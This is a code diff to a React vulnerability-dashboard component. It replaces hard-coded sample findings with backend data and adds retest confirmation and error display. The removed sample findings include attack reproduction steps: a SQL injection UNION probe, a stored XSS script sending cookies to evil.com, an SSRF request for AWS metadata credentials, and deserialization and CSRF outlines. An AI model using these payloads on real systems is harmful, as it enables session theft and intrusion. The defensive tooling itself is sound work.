@@ -12,51 +12,37 @@ import {
   TICKET_STATES,
   WORKFLOW_STORAGE_KEY,
   addDays,
+  applyRetestTruth,
   hydrateWorkflow,
+  normalizeFindingTruth,
 } from '../utils/vulnerabilityWorkflow';
 
 import { apiFetch } from '../config/api';
+import { applyActionConfirmations, dashboardErrorMessage, prepareActionConfirmations } from '../utils/actionConfirmation';
 
-/* ── Seed data (replaced by backend when connected) ── */
-const SEED_VULNS = [
-  { id: 'f-001', cve: 'CVE-2024-47195', finding: 'SQL Injection (Error-Based)', target: 'web-prod-01', cvss: 9.8, vpr: 9.6, severity: 'critical', status: 'Open', module: 'sqli_scanner', confidence: 'HIGH',
-    description: 'Error-based SQL injection via the `id` parameter on /api/user endpoint. The application concatenates user input directly into SQL queries without parameterization.',
-    repro: '1. Navigate to /api/user?id=1\n2. Append a single quote: /api/user?id=1\'\n3. Observe SQL error in response body\n4. Confirm with UNION: /api/user?id=1\' UNION SELECT 1,version(),3--',
-    evidence: 'Response body contains: "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version"',
-    remediation: 'Use parameterized queries (prepared statements). Apply input validation. Deploy WAF rule to block SQLi patterns.' },
-  { id: 'f-002', cve: 'CVE-2024-38094', finding: 'RCE via Java Deserialization', target: 'api.corp.com', cvss: 9.0, vpr: 9.2, severity: 'critical', status: 'In Progress', module: 'deserial_scanner', confidence: 'HIGH',
-    description: 'Java deserialization vulnerability in the API endpoint /api/import. The endpoint accepts serialized Java objects without validation, allowing arbitrary code execution.',
-    repro: '1. Craft a malicious serialized object using ysoserial\n2. POST to /api/import with Content-Type: application/x-java-serialized-object\n3. Observe command execution on the server',
-    evidence: 'ysoserial CommonsCollections6 payload executed successfully — DNS callback received at ForgeCollab',
-    remediation: 'Disable Java deserialization on untrusted input. Implement input validation. Use a serialization whitelist.' },
-  { id: 'f-003', cve: 'CVE-2023-48022', finding: 'RDP BlueKeep Variant', target: '10.0.1.12', cvss: 9.8, vpr: 9.9, severity: 'critical', status: 'Open', module: 'rdp_scanner', confidence: 'MEDIUM',
-    description: 'Remote Desktop Protocol vulnerability allowing pre-authentication remote code execution. The target is running an unpatched version of Windows that is susceptible to CVE-2023-48022.',
-    repro: '1. Run: nmap -p 3389 --script rdp-vuln-ms12-020 10.0.1.12\n2. Confirm vulnerable response\n3. Verify with Forge RDP checker module',
-    evidence: 'RDP service on port 3389 responds with vulnerable version string. Nmap script confirms susceptibility.',
-    remediation: 'Apply Microsoft security update. Enable NLA. Restrict RDP access via firewall rules.' },
-  { id: 'f-004', cve: 'CVE-2024-49112', finding: 'Stored XSS in Comment Field', target: 'web-prod-01', cvss: 7.5, vpr: 7.1, severity: 'high', status: 'Open', module: 'xss_scanner', confidence: 'HIGH',
-    description: 'Stored cross-site scripting vulnerability in the comment submission form. User-supplied HTML/JavaScript is rendered without sanitization in other users\' browsers.',
-    repro: '1. Submit a comment with: <script>document.location="https://evil.com/?c="+document.cookie</script>\n2. View the comment as another user\n3. Observe JavaScript execution in the victim\'s browser',
-    evidence: 'UUID canary e4d5a6b7-c8d9-4e0f-1234-abcdef012345 reflected in response body within <script> tags',
-    remediation: 'Implement output encoding (HTML entity encoding). Use Content Security Policy headers. Sanitize user input server-side.' },
-  { id: 'f-005', cve: 'CVE-2024-43451', finding: 'SSRF via URL Parameter', target: 'api.corp.com', cvss: 6.5, vpr: 6.8, severity: 'high', status: 'Open', module: 'ssrf_scanner', confidence: 'HIGH',
-    description: 'Server-Side Request Forgery via the `callback_url` parameter. The server fetches the user-supplied URL without validation, allowing access to internal services.',
-    repro: '1. POST to /api/webhook with callback_url=http://169.254.169.254/latest/meta-data/\n2. Observe AWS metadata in the response\n3. Extract IAM credentials from the metadata',
-    evidence: 'ForgeCollab OOB callback received from target IP within 3 seconds. Internal metadata endpoint accessible.',
-    remediation: 'Validate and whitelist allowed callback domains. Block requests to internal IP ranges (RFC 1918, link-local). Use SSRF protection libraries.' },
-  { id: 'f-006', cve: 'CVE-2024-49040', finding: 'CSRF Admin Portal Bypass', target: 'admin.corp.com', cvss: 6.1, vpr: 5.4, severity: 'medium', status: 'Accepted', module: 'csrf_scanner', confidence: 'MEDIUM',
-    description: 'Cross-Site Request Forgery on the admin portal\'s user management endpoints. State-changing requests lack CSRF token validation.',
-    repro: '1. Create an HTML page with a form targeting /admin/users/delete\n2. Host the page and trick an admin into visiting it\n3. The admin\'s session cookie is sent with the forged request',
-    evidence: 'POST /admin/users/delete accepts requests without CSRF token. Referer header not validated.',
-    remediation: 'Implement CSRF tokens on all state-changing endpoints. Enable SameSite cookie attribute. Validate Referer/Origin headers.' },
-  { id: 'f-007', cve: 'CVE-2023-44487', finding: 'HTTP/2 Rapid Reset DDoS', target: 'web-prod-01', cvss: 7.5, vpr: 7.0, severity: 'high', status: 'Fixed', module: 'http2_scanner', confidence: 'HIGH',
-    description: 'HTTP/2 Rapid Reset vulnerability allowing denial of service. The server does not properly handle stream reset flood attacks.',
-    repro: '1. Establish HTTP/2 connection\n2. Send rapid RST_STREAM frames\n3. Observe server resource exhaustion',
-    evidence: 'Server CPU spiked to 100% during 10-second rapid reset test. Connection pool exhausted.',
-    remediation: 'Update web server to patched version. Implement HTTP/2 stream rate limiting. Deploy DDoS protection.' },
-];
+/* ── Populated by backend /api/v1/findings + WebSocket live updates ── */
+const SEED_VULNS = [];
 
 const STATUS_OPTIONS = ['Open', 'In Progress', 'Fixed', 'Accepted', 'False Positive'];
+
+// Backend truth is lower-case and API-shaped; the workflow controls use the
+// same title-cased labels as the existing operator UI.  This adapter keeps the
+// normalized status visible rather than replacing live findings with a local
+// optimistic "Open" default.
+const displayStatus = (value) => {
+  const normalized = String(value || 'open').trim().toLowerCase();
+  const labels = {
+    open: 'Open',
+    in_progress: 'In Progress',
+    'in progress': 'In Progress',
+    fixed: 'Fixed',
+    remediated: 'Fixed',
+    accepted: 'Accepted',
+    accepted_risk: 'Accepted',
+    false_positive: 'False Positive',
+  };
+  return labels[normalized] || value || 'Open';
+};
 
 const statusBadge = (s) => {
   if (s === 'Open') return 'critical';
@@ -118,6 +104,7 @@ const Vulnerabilities = ({ authToken }) => {
 
   // Re-test state
   const [retesting, setRetesting] = useState(null);  // finding_id being retested
+  const [retestError, setRetestError] = useState('');
 
   // Status update state
   const [statusUpdating, setStatusUpdating] = useState(null);
@@ -140,6 +127,8 @@ const Vulnerabilities = ({ authToken }) => {
       .then(d => {
         if (d?.findings?.length) {
           setVulns(d.findings.map((f, i) => ({
+            ...normalizeFindingTruth(f),
+            status: displayStatus(f.status),
             id: f.id || f.finding_id || `f-${i}`,
             cve: f.cve || '',
             finding: f.title || f.finding || '',
@@ -147,9 +136,7 @@ const Vulnerabilities = ({ authToken }) => {
             cvss: f.cvss || 0,
             vpr: f.vpr_score || f.vpr || 0,
             severity: (f.severity || 'info').toLowerCase(),
-            status: f.status || 'Open',
             module: f.module || '',
-            confidence: f.confidence || 'MEDIUM',
             description: f.description || '',
             repro: f.reproduction_steps || f.repro || '',
             evidence: f.evidence || '',
@@ -172,17 +159,18 @@ const Vulnerabilities = ({ authToken }) => {
     const { type, event_type, data } = lastMessage;
     if (type !== 'event') return;
     if (event_type === 'finding_new') {
+      const truth = normalizeFindingTruth(data);
       setVulns(prev => [{
-        id: data.finding_id || `f-live-${Date.now()}`,
+        ...truth,
+        status: displayStatus(truth.status),
+        id: data.id || data.finding_id || `f-live-${Date.now()}`,
         cve: data.cve || '',
         finding: data.title || '',
         target: data.target || '',
         cvss: data.cvss || 0,
         vpr: data.vpr || 0,
         severity: (data.severity || 'info').toLowerCase(),
-        status: 'Open',
         module: data.module || '',
-        confidence: data.confidence || 'MEDIUM',
         description: data.description || '',
         repro: data.repro || '',
         evidence: data.evidence || '',
@@ -195,9 +183,20 @@ const Vulnerabilities = ({ authToken }) => {
         queueNote: '',
       }, ...prev]);
     }
-    if (event_type === 'finding_updated' && data.finding_id) {
+    if (event_type === 'finding_updated' && (data.finding_id || data.id)) {
+      const truth = normalizeFindingTruth(data);
+      const findingId = data.finding_id || data.id;
+      const truthPatch = Object.fromEntries(
+        ['confidence', 'verification_state', 'proof_type', 'maturity', 'retest_status']
+          .filter(key => Object.prototype.hasOwnProperty.call(data, key))
+          .map(key => [key, truth[key]])
+      );
       setVulns(prev => prev.map(v =>
-        (v.id === data.finding_id) ? { ...v, status: data.status || v.status } : v
+        (v.id === findingId) ? {
+          ...v,
+          ...truthPatch,
+          status: data.status ? displayStatus(truth.status) : v.status,
+        } : v
       ));
     }
   }, [lastMessage]);
@@ -308,19 +307,44 @@ const Vulnerabilities = ({ authToken }) => {
   }, []);
 
   // Re-test finding
-  const retestFinding = useCallback(async (findingId) => {
+  const retestFinding = useCallback(async (finding) => {
+    const findingId = finding?.id;
+    const target = String(finding?.target || finding?.url || '').trim();
+    if (!findingId || !target) {
+      setRetestError('This finding has no exact target metadata for retest.');
+      return;
+    }
+    const moduleLabel = String(finding?.module || 'the persisted finding module');
+    if (!window.confirm(
+      `Confirm retesting finding ${findingId} with ${moduleLabel} against exact target ${target}?`
+    )) return;
+    setRetestError('');
     setRetesting(findingId);
     try {
-      const res = await apiFetch(`/api/v1/findings/${findingId}/retest`, { method: 'POST' });
+      const confirmationBundle = await prepareActionConfirmations({
+        intent: 'finding.retest',
+        finding_id: findingId,
+        scope: [target],
+        exclude: [],
+      });
+      const res = await apiFetch(`/api/v1/findings/${encodeURIComponent(findingId)}/retest`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(applyActionConfirmations({ dry_run: false }, confirmationBundle)),
+      });
       if (res.ok) {
         const data = await res.json();
-        setVulns(prev => prev.map(v => v.id === findingId ? {
-          ...v,
-          confidence: data.confidence,
-          status: data.still_vulnerable ? v.status : 'Fixed',
-        } : v));
+        setVulns(prev => prev.map(v => {
+          if (v.id !== findingId) return v;
+          return applyRetestTruth(v, data);
+        }));
+      } else {
+        const data = await res.json().catch(() => ({}));
+        setRetestError(dashboardErrorMessage(data, `Retest failed (${res.status})`));
       }
-    } catch {}
+    } catch (error) {
+      setRetestError(error instanceof Error ? error.message : 'Retest failed');
+    }
     setRetesting(null);
   }, []);
 
@@ -570,6 +594,8 @@ const Vulnerabilities = ({ authToken }) => {
                   <th>VPR</th>
                   <th>Severity</th>
                   <th>Confidence</th>
+                  <th>Verification / Proof</th>
+                  <th>Retest</th>
                   <th>Status</th>
                 </tr>
               </thead>
@@ -623,8 +649,13 @@ const Vulnerabilities = ({ authToken }) => {
                         fontFamily: 'var(--font-mono)', fontSize: '10px', fontWeight: 600,
                         color: confidenceColor[v.confidence] || 'var(--text-muted)',
                         textTransform: 'uppercase',
-                      }}>{v.confidence || '—'}</span>
+                      }}>{v.confidence || 'UNVERIFIED'}</span>
                     </td>
+                    <td className="font-mono" style={{ fontSize: '10px' }}>
+                      <div>{v.verification_state || 'unknown'}</div>
+                      <div style={{ color: 'var(--text-muted)' }}>{v.proof_type || 'unknown'} / {v.maturity || 'experimental'}</div>
+                    </td>
+                    <td className="font-mono" style={{ fontSize: '10px', color: 'var(--text-muted)' }}>{v.retest_status || 'not_retested'}</td>
                     <td><Badge severity={statusBadge(v.status)}>{v.status}</Badge></td>
                   </tr>
                 ))}
@@ -712,6 +743,15 @@ const Vulnerabilities = ({ authToken }) => {
                 <ScoreBox label="SEVERITY" value={selected.severity.toUpperCase()} color={severityColor[selected.severity]} />
                 <ScoreBox label="CVSS" value={selected.cvss} color={selected.cvss >= 9 ? '#ff4444' : selected.cvss >= 7 ? '#ff8c00' : '#ffc400'} />
                 <ScoreBox label="SLA" value={selected.slaDays < 0 ? `${Math.abs(selected.slaDays)}D LATE` : `${selected.slaDays}D`} color={selected.slaState === 'overdue' ? 'var(--color-critical)' : selected.slaState === 'due-soon' ? 'var(--color-medium)' : 'var(--color-success)'} />
+              </div>
+
+              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(2, minmax(0, 1fr))', gap: '8px', fontFamily: 'var(--font-mono)', fontSize: '11px' }}>
+                <div>Verification: <strong>{selected.verification_state || 'unknown'}</strong></div>
+                <div>Proof: <strong>{selected.proof_type || 'unknown'}</strong></div>
+                <div>Maturity: <strong>{selected.maturity || 'experimental'}</strong></div>
+                <div>Confidence: <strong>{selected.confidence || 'UNVERIFIED'}</strong></div>
+                <div>Retest: <strong>{selected.retest_status || 'not_retested'}</strong></div>
+                <div>Workflow: <strong>{selected.status || 'open'}</strong></div>
               </div>
 
               {/* Status Editor */}
@@ -825,7 +865,7 @@ const Vulnerabilities = ({ authToken }) => {
               <Button
                 variant="primary"
                 style={{ flex: 1, fontSize: '12px', padding: '8px 12px' }}
-                onClick={() => retestFinding(selected.id)}
+                onClick={() => retestFinding(selected)}
                 disabled={retesting === selected.id}
               >
                 {retesting === selected.id ? (
@@ -844,6 +884,11 @@ const Vulnerabilities = ({ authToken }) => {
                 Copy Ticket
               </Button>
             </div>
+            {retestError && (
+              <div style={{ padding: '0 20px 12px', color: 'var(--color-critical)', fontFamily: 'var(--font-mono)', fontSize: '11px' }}>
+                {retestError}
+              </div>
+            )}
           </div>
         )}
       </div>
